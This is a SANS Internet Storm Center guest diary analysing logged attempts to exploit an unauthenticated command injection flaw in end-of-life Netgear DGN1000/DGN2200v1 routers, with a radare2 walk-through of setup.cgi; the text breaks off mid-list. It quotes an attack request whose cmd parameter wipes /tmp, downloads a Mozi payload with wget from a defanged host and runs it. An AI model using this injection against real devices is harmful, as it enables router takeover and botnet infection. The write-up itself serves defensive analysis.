---
title: PCAPs or It Didn't Happen: Exposing an Old Netgear Vulnerability Still Active in 2025 &#x5b;Guest Diary&#x5d;, (Thu, Jan 30th)
url: https://isc.sans.edu/diary/rss/31638
source: SANS Internet Storm Center, InfoCON: green
date: 2025-01-31
fetch_date: 2025-10-06T20:14:54.550879
---

# PCAPs or It Didn't Happen: Exposing an Old Netgear Vulnerability Still Active in 2025 &#x5b;Guest Diary&#x5d;, (Thu, Jan 30th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31634)
* [next](/diary/31642)

# [PCAPs or It Didn't Happen: Exposing an Old Netgear Vulnerability Still Active in 2025 [Guest Diary]](/forums/diary/PCAPs%2Bor%2BIt%2BDidnt%2BHappen%2BExposing%2Ban%2BOld%2BNetgear%2BVulnerability%2BStill%2BActive%2Bin%2B2025%2BGuest%2BDiary/31638/)

**Published**: 2025-01-30. **Last Updated**: 2025-05-02 22:13:31 UTC
**by** [Guy Bruneau](/handler_list.html#guy-bruneau) (Version: 1)

[0 comment(s)](/diary/PCAPs%2Bor%2BIt%2BDidnt%2BHappen%2BExposing%2Ban%2BOld%2BNetgear%2BVulnerability%2BStill%2BActive%2Bin%2B2025%2BGuest%2BDiary/31638/#comments)

[This is a Guest Diary by David Watson, an ISC intern as part of the SANS.edu [BACS](https://www.sans.edu/cyber-security-programs/bachelors-degree/) program]

One thing I’ve learned about cybersecurity, particularly during my time here at the Internet Storm Center is this: If you don’t capture detailed network data (like PCAPs), you can easily miss the full picture of an attack, even with the most aggressive logging practices.

One of the attack observations I submitted on January 12th detailed an older vulnerability that uses HTTP GET requests, attempting to perform unauthenticated OS command injections on some legacy Netgear devices, targeting the ‘setup.cgi’ script. I was curious as to which Netgear devices might be involved, and some research led me to a few publications on exploit-db.com, which identified specifically the DGN1000 with firmware versions before 1.1.0.48, and the DGN2200v1 (all firmware versions) modem/router models.[[2](https://www.exploit-db.com/exploits/25978)][[3](https://www.exploit-db.com/exploits/43055)] Both of these models are shown to be “end of service” on the Netgear website. [[4](https://www.netgear.com/support/product/dgn2200v1/)][[5](https://www.netgear.com/support/product/dgn1000/)] There was no CVE mentioned, but a few days later I found out from another post on the 15th of January here at the Internet Storm Center, written by Dr. Yee Ching Tok, Ph.D., ISC Handler:

“This vulnerability was only formally registered in the CVE database in 2024 although it was first disclosed in May 2013, and the corresponding CVE entry was published recently on January 10, 2025.” [[6](https://isc.sans.edu/diary/The%2BCurious%2BCase%2Bof%2Ba%2B12YearOld%2BNetgear%2BRouter%2BVulnerability/31592)]

CVE-2024-12847 has a CVSS score of 9.8 as shown on NIST.gov. [[7](https://nvd.nist.gov/vuln/detail/CVE-2024-12847)] This post will illustrate how I found this in my logs, why it matters, and how packet captures and Zeek logs proved essential.

**An Older Vulnerability Resurfaces**

Netgear’s DGN1000 and DGN2200v1 devices are end-of-life (EOL) devices. The bug sits in a script called ‘setup.cgi’, (cgi = Common Gateway Interface) which is meant for administrative management of the router. Attackers discovered that by passing certain parameters, one can execute arbitrary OS commands on the router’s underlying Linux operating system as root, without any authentication checks. Over the last several months my web logs showed 257 suspicious HTTP GET requests from 16 unique IP addresses to ‘/setup.cgi’.

![](https://isc.sans.edu/diaryimages/images/David_Watson_pic1.png)

![](https://isc.sans.edu/diaryimages/images/David_Watson_pic2.png)

Looking into my Zeek logs to correlate this activity revealed an interesting payload, showing two examples of the command injection attempts here:

![](https://isc.sans.edu/diaryimages/images/David_Watson_pic3.png)

Breaking this down, we have:

* GET /setup.cgi?next\_file=netgear.cfg – Targeting the setup.cgi script.
* &todo=syscmd – Calling the syscmd function.
* &cmd=rm+-rf+/tmp/\*;wget+hxxp[://]<ip\_address:port>/Mozi[.]m+-O+/tmp/netgear;sh+netgear – OS command injection.
* &curpath=/ - Setting “current path” to root.
* &currentsetting.htm=1 – unclear exactly what this part does.

The command injection attempt aims to:

* rm -rf /tmp/\*; - Remove the contents of the /tmp directory.
* wget hxxp[://]<ip\_address:port>/Mozi[.]m -O /tmp/netgear; - Retrieve malicious script (Mozi botnet related? [[14](https://thehackernews.com/2024/11/androxgh0st-malware-integrates-mozi.html)]) from remote server, save it in /tmp directory and name it “netgear”.
* sh netgear – Execute malicious script on target device.

**Reverse-Engineering setup.cgi**

Curiosity drove me to download a vulnerable version of the DGN1000 firmware, specifically version 1.1.00.24, still available right off the Netgear website! [[8](https://kb.netgear.com/2649/NETGEAR-Open-Source-Code-for-Programmers-GPL)] I found the setup.cgi file, located in the <source>/target/sbin directory. Running the ‘file’ command showed:

setup.cgi: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped

Using my relatively new reverse engineering “ninja” skills gained from several CTFs I have participated in over the last few years (and various websites with C documentation), I decided to attempt a disassembly with radare2, [[10](https://github.com/radareorg/radare2)] as it allows me to look inside this compiled binary and see how it works.

I am interested in the syscmd function, so I ran “iz~syscmd”, which gave me a string reference to syscmd and and a pointer to its location. Running “pdf” (print disassembly of function) after navigating to that address within the binary reveals the function associated with syscmd. Here is what that looks like:

![](https://isc.sans.edu/diaryimages/images/David_Watson_pic4.png)

![](https://isc.sans.edu/diaryimages/images/David_Watson_pic5.png)

Right off the bat, I can see some standard C library calls like putenv, printf, snprintf, chdir, puts, fflush, popen, fread, fwrite, and pclose. [[9](https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name)] “find\_val” might be a custom or proprietary function specific to the Netgear firmware, but I did not find any specific reference pointing to this as of now. Given the context of this disassembly, we will assume that find\_val has something to do with retrieving user-supplied parameters. Based on the sequence of events here, this is what I can conclude from the syscmd function:

* putenv, puts, and printf have to do with setting up the environment, status messages and/or error reporting and/or debugging.[[9](https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name)]
* find\_val most likely retrieves user-supplied parameters.
* snprintf formats and stores characters into the buffer [9], likely from find\_val.
* chdir possibly relates to the curpath=/ in the HTTP request.
* fflush writes the contents of the buffer to the output stream. [[9](https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name)]
* popen spawns a shell instance and executes the command. [[11](https://c-for-dummies.com/blog/?p=1418)]
* fread() and fwrite() capture the output and send it somewhere (log file and/or back to the user if necessary)[9]

Based on what we can see how the syscmd function is laid out, there is absolutely zero input sanitization, and, looking at the entire setup.cgi script there is no mention of any authentication checks before being able to run these commands.

As far as the netgear.cfg file goes, it is not entirely clear why there is a “next\_file = netgear.cfg” parameter before the “&todo=syscmd…etc” begins. I did not have access to the netgear.cfg file as it was a broken symbolic link pointing to the /tmp directory which was empty. I did find the “currentsetting.htm” file in source/target/www.eng, which, when printed, shows basic information about the device:

* Firmware=V1.1.0.24NA
* RegionTag=DGN1000\_NA
* Region=US
* Model=D...